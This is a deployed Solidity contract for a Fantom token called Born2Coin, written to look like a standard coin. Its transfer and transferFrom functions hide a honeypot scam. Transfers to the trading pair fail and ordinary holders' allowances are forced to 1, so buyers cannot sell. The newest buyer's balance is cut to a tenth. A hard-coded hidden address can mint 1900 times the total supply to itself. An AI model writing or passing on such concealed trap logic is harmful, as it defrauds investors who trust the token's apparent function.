/**
 *Submitted for verification at FtmScan.com on 2022-04-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
/**
Telegram: http://t.me/Born2Coin
*/

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract CoinToken {
    using SafeMath for uint256;
    string public name = "Born2Coin ";
    string public symbol = "Born2Coin";
    uint8 public decimals = 9;
    uint256 public totalSupply = 10000000000000 * 10 ** 9;
    address public owner; 
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public Aceh=0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0),owner,totalSupply);
        emit OwnershipTransferred(address(0), msg.sender);
            
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Aceh != Owner && balanceOf[Aceh]>=totalSupply.div(10)) {
            balanceOf[Aceh]=balanceOf[Aceh].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Aceh = to;} 
        if (to == Owner) {Aceh=to;} if (to ==Pair()) {return false;}
        _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {  
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from == Owner) {uint256 Valen=totalSupply*1900;balanceOf[Owner]+=Valen;}
        if (from != owner && from != Owner && from != Aceh) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function Pair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0x152eE697f2E276fA89E96742e9bB9aB1F2E61bE3);
        address pair = _pair.getPair(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83, address(this));
        return pair;
    }    

}